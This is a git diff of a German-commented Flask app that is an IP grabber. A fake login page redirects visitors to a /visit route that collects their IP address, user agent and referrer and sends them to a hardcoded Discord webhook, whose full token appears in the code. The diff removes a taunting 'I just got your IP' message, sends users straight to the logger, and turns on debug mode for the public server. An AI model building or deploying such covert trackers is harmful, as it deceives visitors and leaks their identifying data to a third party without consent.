@@ -5,14 +5,14 @@ import requests
 
 app = Flask(__name__)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1528124860239315048/PXq2pkg0vyWbodZ3f98_AF8b2fBIhaw4sjm-lSP-pAxFq6ckuy5hh6obvcRMaPvcHTKx"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1527305360539517031/X78P4aN1u9gSLbo9mAHZkaDQTNJN-boj4e8eabaARIAFhVMgEw-1YZVpXNXeJxgQNGqQ"
 
 def get_client_ip(request):
     # Alle möglichen Header durchgehen
     headers = [
         'X-Forwarded-For',
         'X-Real-IP',
-        'CF-Connecting-IP',  # Falls Cloudflare
+        'CF-Connecting-IP',
         'True-Client-IP'
     ]
     for header in headers:
@@ -26,14 +26,14 @@ def get_client_ip(request):
 @app.route('/visit')
 def log_ip():
     ip = get_client_ip(request)
-    # ... rest wie vorher
+    
     forwarded = request.headers.get('X-Forwarded-For')
     if forwarded:
         ips = [x.strip() for x in forwarded.split(',')]
-        ip = ips[0]  # Erste ist meist der echte Client
+        ip = ips[0]
     
     if not ip or ip.startswith('10.') or ip.startswith('172.16.') or ip.startswith('192.168.') or ip == '127.0.0.1':
-        ip = request.remote_addr  # Fallback
+        ip = request.remote_addr or 'Unknown'
     
     user_agent = request.headers.get('User-Agent', 'Unknown')
     referrer = request.headers.get('Referer', 'None')
@@ -135,56 +135,20 @@ button{
 </html>
 """
 
-SUCCESS_PAGE = """
-<!DOCTYPE html>
-<html lang="de">
-<head>
-<meta charset="UTF-8">
-<title>Access Granted</title>
-<style>
-body{
-    background:black;
-    color:lime;
-    font-family:Consolas, monospace;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    margin:0;
-}
-h1{
-    text-shadow:0 0 10px lime;
-}
-</style>
-</head>
-<body>
-
-<h1>ACCESS GRANTED</h1>
-
-</body>
-</html>
-"""
-
 @app.route("/", methods=["GET", "POST"])
 def login():
     message = ""
 
     if request.method == "POST":
         if request.form.get("password") == PASSWORD:
-            return "Holy idiot I just got your IP and logged it, Idiot"
+            # Hier wird jetzt richtig zum Logger weitergeleitet
+            return redirect(url_for("log_ip"))
             
         else:
             message = "Wrong password!"
 
-    return render_template_string(LOGIN_PAGE, message=message) 
+    return render_template_string(LOGIN_PAGE, message=message)
 
-@app.route("/success")
-def success():
-    return redirect("https://projekt-d5qu.onrender.com/visit")
-
-if __name__ == "__main__":
-    app.run(debug=True)
-    
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, debug=True)
